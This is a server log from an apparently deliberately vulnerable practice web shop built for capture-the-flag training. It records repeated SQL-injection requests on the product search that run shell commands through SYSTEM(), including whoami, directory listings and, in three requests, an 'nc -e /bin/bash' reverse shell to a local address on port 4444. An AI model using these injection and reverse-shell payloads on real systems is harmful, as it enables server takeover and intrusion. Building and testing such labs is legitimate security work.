+2025-08-16 14:49:11,241 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 14:49:11,357 - 192.168.0.242 - - [16/Aug/2025 14:49:11] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.105+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 14:49:11,389 - 192.168.0.242 - - [16/Aug/2025 14:49:11] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 14:49:11,391 - 192.168.0.242 - - [16/Aug/2025 14:49:11] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 14:49:20,002 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 14:59:37,805 - 192.168.0.221 - - [16/Aug/2025 14:59:37] "GET /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-16 14:59:46,129 - 192.168.0.221 - - [16/Aug/2025 14:59:46] "GET /backup HTTP/1.1" 200 -
+2025-08-16 14:59:47,773 - 192.168.0.221 - - [16/Aug/2025 14:59:47] "GET /backup/readme HTTP/1.1" 200 -
+2025-08-16 14:59:47,836 - 192.168.0.221 - - [16/Aug/2025 14:59:47] "GET /favicon.ico HTTP/1.1" 200 -
+2025-08-16 14:59:49,261 - 192.168.0.221 - - [16/Aug/2025 14:59:49] "GET /backup/readme HTTP/1.1" 200 -
+2025-08-16 14:59:49,327 - 192.168.0.221 - - [16/Aug/2025 14:59:49] "GET /favicon.ico HTTP/1.1" 200 -
+2025-08-16 15:39:02,594 - 192.168.0.221 - - [16/Aug/2025 15:39:02] "GET /favicon.ico HTTP/1.1" 200 -
+2025-08-16 21:07:10,418 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-16 21:07:10,520 - 192.168.0.241 - - [16/Aug/2025 21:07:10] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.245+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-16 21:07:10,762 - 192.168.0.241 - - [16/Aug/2025 21:07:10] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-16 21:07:10,765 - 192.168.0.241 - - [16/Aug/2025 21:07:10] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-16 21:07:12,078 - 192.168.0.241 - - [16/Aug/2025 21:07:12] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 09:40:38,466 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-18 09:40:38,552 - 192.168.0.242 - - [18/Aug/2025 09:40:38] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.245+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 09:40:38,597 - 192.168.0.242 - - [18/Aug/2025 09:40:38] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 09:40:38,598 - 192.168.0.242 - - [18/Aug/2025 09:40:38] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-18 09:40:39,737 - 192.168.0.242 - - [18/Aug/2025 09:40:39] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 17:39:51,056 - 192.168.0.241 - - [18/Aug/2025 17:39:51] "GET /products?search=headphones HTTP/1.1" 200 -
+2025-08-18 17:39:51,091 - 192.168.0.241 - - [18/Aug/2025 17:39:51] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:39:55,621 - 192.168.0.241 - - [18/Aug/2025 17:39:55] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-18 17:42:09,521 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-18 17:42:09,527 - 192.168.0.241 - - [18/Aug/2025 17:42:09] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:42:09,566 - 192.168.0.241 - - [18/Aug/2025 17:42:09] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:42:09,568 - 192.168.0.241 - - [18/Aug/2025 17:42:09] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-18 17:42:20,593 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-18 17:42:20,662 - 192.168.0.241 - - [18/Aug/2025 17:42:20] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:42:20,692 - 192.168.0.241 - - [18/Aug/2025 17:42:20] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:42:20,694 - 192.168.0.241 - - [18/Aug/2025 17:42:20] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-18 17:44:59,348 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-18 17:44:59,402 -  * Restarting with stat
+2025-08-18 17:44:59,611 -  * Debugger is active!
+2025-08-18 17:44:59,611 -  * Debugger PIN: 130-425-084
+2025-08-18 17:45:00,627 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-18 17:45:00,654 -  * Restarting with stat
+2025-08-18 17:45:00,868 -  * Debugger is active!
+2025-08-18 17:45:00,869 -  * Debugger PIN: 130-425-084
+2025-08-18 17:45:07,076 - 192.168.0.241 - - [18/Aug/2025 17:45:07] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:45:07,108 - 192.168.0.241 - - [18/Aug/2025 17:45:07] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:45:07,823 - 192.168.0.241 - - [18/Aug/2025 17:45:07] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 17:45:14,279 - 192.168.0.241 - - [18/Aug/2025 17:45:14] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:45:14,301 - 192.168.0.241 - - [18/Aug/2025 17:45:14] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:47:20,920 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.0.245:5000
+2025-08-18 17:47:20,920 - [33mPress CTRL+C to quit[0m
+2025-08-18 17:47:20,922 -  * Restarting with stat
+2025-08-18 17:47:21,296 -  * Debugger is active!
+2025-08-18 17:47:21,298 -  * Debugger PIN: 130-425-084
+2025-08-18 17:48:14,530 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.0.245:5000
+2025-08-18 17:48:14,530 - [33mPress CTRL+C to quit[0m
+2025-08-18 17:48:14,531 -  * Restarting with stat
+2025-08-18 17:48:14,749 -  * Debugger is active!
+2025-08-18 17:48:14,749 -  * Debugger PIN: 130-425-084
+2025-08-18 17:48:23,253 - 192.168.0.241 - - [18/Aug/2025 17:48:23] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:48:23,296 - 192.168.0.241 - - [18/Aug/2025 17:48:23] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:48:55,885 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-18 17:48:55,919 -  * Restarting with stat
+2025-08-18 17:48:56,149 -  * Debugger is active!
+2025-08-18 17:48:56,149 -  * Debugger PIN: 130-425-084
+2025-08-18 17:48:57,923 - 192.168.0.241 - - [18/Aug/2025 17:48:57] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:48:57,957 - 192.168.0.241 - - [18/Aug/2025 17:48:57] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:49:02,529 - 192.168.0.241 - - [18/Aug/2025 17:49:02] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:49:02,567 - 192.168.0.241 - - [18/Aug/2025 17:49:02] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:49:03,427 - 192.168.0.241 - - [18/Aug/2025 17:49:03] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:49:03,454 - 192.168.0.241 - - [18/Aug/2025 17:49:03] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:49:06,705 - 192.168.0.241 - - [18/Aug/2025 17:49:06] "GET /products?search='+UNION+SELECT+1,SYSTEM('ls+-la'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:49:06,744 - 192.168.0.241 - - [18/Aug/2025 17:49:06] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:49:29,883 - 192.168.0.241 - - [18/Aug/2025 17:49:29] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:49:29,909 - 192.168.0.241 - - [18/Aug/2025 17:49:29] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:49:38,402 - 192.168.0.241 - - [18/Aug/2025 17:49:38] "GET /products?search='+UNION+SELECT+1,SYSTEM('ls+/home/ctfuser'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:49:38,443 - 192.168.0.241 - - [18/Aug/2025 17:49:38] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:52:11,769 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-18 17:52:11,808 -  * Restarting with stat
+2025-08-18 17:52:12,027 -  * Debugger is active!
+2025-08-18 17:52:12,027 -  * Debugger PIN: 130-425-084
+2025-08-18 17:52:14,178 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-18 17:52:14,209 - 192.168.0.241 - - [18/Aug/2025 17:52:14] "GET /products?search='+UNION+SELECT+1,SYSTEM('ls+/home/ctfuser'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:52:14,248 - 192.168.0.241 - - [18/Aug/2025 17:52:14] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:52:14,386 - 192.168.0.241 - - [18/Aug/2025 17:52:14] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 17:52:16,138 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-18 17:52:16,145 - 192.168.0.241 - - [18/Aug/2025 17:52:16] "GET /products?search='+UNION+SELECT+1,SYSTEM('ls+/home/ctfuser'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:52:16,168 - 192.168.0.241 - - [18/Aug/2025 17:52:16] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:52:16,939 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-18 17:52:16,945 - 192.168.0.241 - - [18/Aug/2025 17:52:16] "GET /products?search='+UNION+SELECT+1,SYSTEM('ls+/home/ctfuser'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:52:16,982 - 192.168.0.241 - - [18/Aug/2025 17:52:16] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:52:22,352 - Privilege drop failed: [Errno 1] Operation not permitted
+2025-08-18 17:52:22,358 - 192.168.0.241 - - [18/Aug/2025 17:52:22] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:52:22,389 - 192.168.0.241 - - [18/Aug/2025 17:52:22] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:53:12,222 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-18 17:53:12,283 -  * Restarting with stat
+2025-08-18 17:53:12,511 -  * Debugger is active!
+2025-08-18 17:53:12,511 -  * Debugger PIN: 130-425-084
+2025-08-18 17:53:14,712 - 192.168.0.241 - - [18/Aug/2025 17:53:14] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:53:14,741 - 192.168.0.241 - - [18/Aug/2025 17:53:14] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:53:14,788 - 192.168.0.241 - - [18/Aug/2025 17:53:14] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 17:53:31,583 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-18 17:53:31,661 -  * Restarting with stat
+2025-08-18 17:53:31,900 -  * Debugger is active!
+2025-08-18 17:53:31,901 -  * Debugger PIN: 130-425-084
+2025-08-18 17:53:35,666 - 192.168.0.241 - - [18/Aug/2025 17:53:35] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:53:35,697 - 192.168.0.241 - - [18/Aug/2025 17:53:35] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:53:35,701 - 192.168.0.241 - - [18/Aug/2025 17:53:35] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-18 17:53:35,758 - 192.168.0.241 - - [18/Aug/2025 17:53:35] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 17:53:44,768 - 192.168.0.241 - - [18/Aug/2025 17:53:44] "[32mGET /product/996 HTTP/1.1[0m" 302 -
+2025-08-18 17:53:44,775 - 192.168.0.241 - - [18/Aug/2025 17:53:44] "GET /products HTTP/1.1" 200 -
+2025-08-18 17:53:44,814 - 192.168.0.241 - - [18/Aug/2025 17:53:44] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:53:47,265 - 192.168.0.241 - - [18/Aug/2025 17:53:47] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:53:48,253 - 192.168.0.241 - - [18/Aug/2025 17:53:48] "[32mPOST /add_to_cart HTTP/1.1[0m" 302 -
+2025-08-18 17:53:48,264 - 192.168.0.241 - - [18/Aug/2025 17:53:48] "GET /cart HTTP/1.1" 200 -
+2025-08-18 17:53:52,017 - 192.168.0.241 - - [18/Aug/2025 17:53:52] "GET /cart HTTP/1.1" 200 -
+2025-08-18 17:53:52,082 - 192.168.0.241 - - [18/Aug/2025 17:53:52] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 17:53:52,696 - 192.168.0.241 - - [18/Aug/2025 17:53:52] "GET /cart HTTP/1.1" 200 -
+2025-08-18 17:53:52,766 - 192.168.0.241 - - [18/Aug/2025 17:53:52] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 17:53:53,542 - 192.168.0.241 - - [18/Aug/2025 17:53:53] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:54:10,039 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-18 17:54:10,101 -  * Restarting with stat
+2025-08-18 17:54:10,327 -  * Debugger is active!
+2025-08-18 17:54:10,328 -  * Debugger PIN: 130-425-084
+2025-08-18 17:54:10,994 - 192.168.0.241 - - [18/Aug/2025 17:54:10] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:54:11,027 - 192.168.0.241 - - [18/Aug/2025 17:54:11] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:54:11,028 - 192.168.0.241 - - [18/Aug/2025 17:54:11] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-18 17:54:11,073 - 192.168.0.241 - - [18/Aug/2025 17:54:11] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 17:54:12,332 - 192.168.0.241 - - [18/Aug/2025 17:54:12] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:54:12,387 - 192.168.0.241 - - [18/Aug/2025 17:54:12] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:54:12,388 - 192.168.0.241 - - [18/Aug/2025 17:54:12] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-18 17:54:13,070 - 192.168.0.241 - - [18/Aug/2025 17:54:13] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:54:13,096 - 192.168.0.241 - - [18/Aug/2025 17:54:13] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:54:13,098 - 192.168.0.241 - - [18/Aug/2025 17:54:13] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-18 17:54:14,461 - 192.168.0.241 - - [18/Aug/2025 17:54:14] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:54:14,505 - 192.168.0.241 - - [18/Aug/2025 17:54:14] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:54:14,509 - 192.168.0.241 - - [18/Aug/2025 17:54:14] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-18 17:54:14,554 - 192.168.0.241 - - [18/Aug/2025 17:54:14] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 17:54:14,612 - 192.168.0.241 - - [18/Aug/2025 17:54:14] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:54:14,641 - 192.168.0.241 - - [18/Aug/2025 17:54:14] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:54:14,643 - 192.168.0.241 - - [18/Aug/2025 17:54:14] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-18 17:54:14,680 - 192.168.0.241 - - [18/Aug/2025 17:54:14] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 17:54:14,752 - 192.168.0.241 - - [18/Aug/2025 17:54:14] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:54:14,782 - 192.168.0.241 - - [18/Aug/2025 17:54:14] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-18 17:54:14,783 - 192.168.0.241 - - [18/Aug/2025 17:54:14] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:54:14,921 - 192.168.0.241 - - [18/Aug/2025 17:54:14] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 17:54:19,382 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-18 17:54:19,462 -  * Restarting with stat
+2025-08-18 17:54:19,789 -  * Debugger is active!
+2025-08-18 17:54:19,790 -  * Debugger PIN: 130-425-084
+2025-08-18 17:54:20,288 - 192.168.0.241 - - [18/Aug/2025 17:54:20] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:54:20,325 - 192.168.0.241 - - [18/Aug/2025 17:54:20] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:54:20,392 - 192.168.0.241 - - [18/Aug/2025 17:54:20] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 17:54:57,927 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-18 17:54:57,981 -  * Restarting with stat
+2025-08-18 17:54:58,205 -  * Debugger is active!
+2025-08-18 17:54:58,206 -  * Debugger PIN: 130-425-084
+2025-08-18 17:54:58,628 - 192.168.0.241 - - [18/Aug/2025 17:54:58] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:54:58,672 - 192.168.0.241 - - [18/Aug/2025 17:54:58] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:54:58,675 - 192.168.0.241 - - [18/Aug/2025 17:54:58] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-18 17:54:58,720 - 192.168.0.241 - - [18/Aug/2025 17:54:58] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 17:55:21,293 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-18 17:55:21,347 -  * Restarting with stat
+2025-08-18 17:55:21,564 -  * Debugger is active!
+2025-08-18 17:55:21,565 -  * Debugger PIN: 130-425-084
+2025-08-18 17:55:25,222 - 192.168.0.241 - - [18/Aug/2025 17:55:25] "GET /products?search=headphones HTTP/1.1" 200 -
+2025-08-18 17:55:25,262 - 192.168.0.241 - - [18/Aug/2025 17:55:25] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:55:33,851 - 192.168.0.241 - - [18/Aug/2025 17:55:33] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:55:33,884 - 192.168.0.241 - - [18/Aug/2025 17:55:33] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:55:33,924 - 192.168.0.241 - - [18/Aug/2025 17:55:33] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 17:55:56,688 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-18 17:55:56,750 -  * Restarting with stat
+2025-08-18 17:56:06,467 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.0.245:5000
+2025-08-18 17:56:06,467 - [33mPress CTRL+C to quit[0m
+2025-08-18 17:56:06,468 -  * Restarting with stat
+2025-08-18 17:56:06,708 -  * Debugger is active!
+2025-08-18 17:56:06,708 -  * Debugger PIN: 130-425-084
+2025-08-18 17:56:06,761 - 192.168.0.241 - - [18/Aug/2025 17:56:06] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:56:06,800 - 192.168.0.241 - - [18/Aug/2025 17:56:06] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:56:06,842 - 192.168.0.241 - - [18/Aug/2025 17:56:06] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 17:56:47,878 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-18 17:56:47,928 -  * Restarting with stat
+2025-08-18 17:56:48,139 -  * Debugger is active!
+2025-08-18 17:56:48,139 -  * Debugger PIN: 130-425-084
+2025-08-18 17:56:52,413 - 192.168.0.241 - - [18/Aug/2025 17:56:52] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:56:52,441 - 192.168.0.241 - - [18/Aug/2025 17:56:52] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:56:52,493 - 192.168.0.241 - - [18/Aug/2025 17:56:52] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 17:56:53,423 - 192.168.0.241 - - [18/Aug/2025 17:56:53] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:56:53,451 - 192.168.0.241 - - [18/Aug/2025 17:56:53] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:56:53,483 - 192.168.0.241 - - [18/Aug/2025 17:56:53] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 17:56:54,630 - 192.168.0.241 - - [18/Aug/2025 17:56:54] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:56:54,658 - 192.168.0.241 - - [18/Aug/2025 17:56:54] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:57:45,334 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-18 17:57:45,390 -  * Restarting with stat
+2025-08-18 17:57:45,615 -  * Debugger is active!
+2025-08-18 17:57:45,616 -  * Debugger PIN: 130-425-084
+2025-08-18 17:57:46,091 - 192.168.0.241 - - [18/Aug/2025 17:57:46] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:57:46,134 - 192.168.0.241 - - [18/Aug/2025 17:57:46] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:57:46,948 - 192.168.0.241 - - [18/Aug/2025 17:57:46] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 17:57:46,977 - 192.168.0.241 - - [18/Aug/2025 17:57:46] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 17:59:43,992 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/img.py', reloading
+2025-08-18 17:59:44,042 -  * Restarting with stat
+2025-08-18 17:59:44,245 -  * Debugger is active!
+2025-08-18 17:59:44,246 -  * Debugger PIN: 130-425-084
+2025-08-18 18:00:31,399 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/img.py', reloading
+2025-08-18 18:00:31,427 -  * Restarting with stat
+2025-08-18 18:00:31,627 -  * Debugger is active!
+2025-08-18 18:00:31,628 -  * Debugger PIN: 130-425-084
+2025-08-18 18:00:34,650 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/img.py', reloading
+2025-08-18 18:00:34,683 -  * Restarting with stat
+2025-08-18 18:00:34,897 -  * Debugger is active!
+2025-08-18 18:00:34,898 -  * Debugger PIN: 130-425-084
+2025-08-18 18:01:18,043 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/img.py', reloading
+2025-08-18 18:01:18,072 -  * Restarting with stat
+2025-08-18 18:01:18,299 -  * Debugger is active!
+2025-08-18 18:01:18,300 -  * Debugger PIN: 130-425-084
+2025-08-18 18:01:43,306 - 192.168.0.241 - - [18/Aug/2025 18:01:43] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:01:43,336 - 192.168.0.241 - - [18/Aug/2025 18:01:43] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:01:44,906 - 192.168.0.241 - - [18/Aug/2025 18:01:44] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:01:44,930 - 192.168.0.241 - - [18/Aug/2025 18:01:44] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:01:44,992 - 192.168.0.241 - - [18/Aug/2025 18:01:44] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:02:10,472 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-18 18:02:10,529 -  * Restarting with stat
+2025-08-18 18:02:10,773 -  * Debugger is active!
+2025-08-18 18:02:10,773 -  * Debugger PIN: 130-425-084
+2025-08-18 18:02:11,033 - 192.168.0.241 - - [18/Aug/2025 18:02:11] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:02:11,061 - 192.168.0.241 - - [18/Aug/2025 18:02:11] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:02:11,102 - 192.168.0.241 - - [18/Aug/2025 18:02:11] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:02:12,211 - 192.168.0.241 - - [18/Aug/2025 18:02:12] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:02:12,261 - 192.168.0.241 - - [18/Aug/2025 18:02:12] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:02:12,845 - 192.168.0.241 - - [18/Aug/2025 18:02:12] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
